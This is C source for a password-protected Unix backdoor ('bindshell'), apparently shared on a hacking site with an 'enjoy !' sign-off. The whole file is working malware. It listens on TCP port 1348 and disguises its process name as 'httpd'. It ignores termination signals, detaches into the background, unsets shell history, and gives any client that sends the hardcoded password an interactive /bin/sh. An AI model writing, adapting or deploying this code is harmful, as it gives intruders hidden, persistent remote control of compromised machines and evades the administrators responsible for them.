/* mybindshell.c coded by konewka (www.olek.org)
* backdoor (bindshell) with password.
* cleaned up code.
* enjoy !
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <signal.h>

#define PORT 1348
#define HIDE "httpd"
#define SHELL "/bin/sh"
#define SYSCMD "unset HISTFILE; uname -srmn; w"

char passwd[] = "qwerty6";
char motd[] = "bindshell v3.0 by konewka (www.olek.org)\n";

void go_shell(int sd) {
    char *buffer = (char *)malloc(strlen(passwd)+1);

    read(sd, buffer, strlen(passwd));
    if (strncmp(buffer, passwd, strlen(passwd)))
	goto exit;
    
    write(sd, motd, sizeof(motd));
    chdir("/");
    /* stdout, stdin, stderr */
    dup2(sd, 0); dup2(sd, 1); dup2(sd, 2);
    system(SYSCMD);
    execl(SHELL, SHELL, (char *)0);
    
    exit:
	close(sd);
	exit(0);
}

main(int argc, char *argv[]) {
    struct sockaddr_in adr;
    int in, out, len, i, f;
    
    memset(&adr, 0, sizeof(adr));
    adr.sin_family = AF_INET;
    adr.sin_port = htons(PORT);
    adr.sin_addr.s_addr = INADDR_ANY;
    
    for (i=0;i<argc;i++)
	memset(argv[i], 0, strlen(argv[i]));

    strncpy(argv[0], HIDE, strlen(HIDE));
    
    signal(SIGINT, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGKILL, SIG_IGN);

    if ((in = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
	perror("socket()");
	return -1; 
    }

    if (bind(in, (struct sockaddr *)&adr, sizeof(adr)) < 0) {
	perror("bind()");
	return -1; 
    }
    
    if (listen(in, 3) < 0) {
	perror("listen()");
	return -1; 
    }

    len = sizeof(adr);
    
    if ((f = fork()) < 0) {
	printf("fork() error\n");
	return -1;
    }
    else if (f)
	exit(0);
    
    while (1) {
	out = accept(in, (struct sockaddr *)&adr, &len);
	if (fork() != 0) {
	    close(in);
	    go_shell(out); 
	}
	close(out); 
    }
    
    return 0;
}
